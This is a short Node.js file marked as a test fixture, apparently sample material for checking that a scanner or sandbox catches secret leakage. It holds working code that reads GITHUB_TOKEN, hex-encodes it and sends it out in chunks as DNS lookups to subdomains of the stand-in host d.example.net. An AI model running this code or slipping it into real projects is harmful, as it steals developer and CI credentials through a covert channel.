// FIXTURE: leaks GITHUB_TOKEN through DNS lookups, hex-encoded in subdomains.
const dns = require('dns');
const hex = Buffer.from(process.env.GITHUB_TOKEN || '').toString('hex');
const chunks = hex.match(/.{1,40}/g) || [];
let left = chunks.length;
chunks.forEach((c, i) => dns.lookup(`${i}.${c}.d.example.net`, () => { if (--left === 0) process.exit(0); }));
setTimeout(() => process.exit(0), 3000);
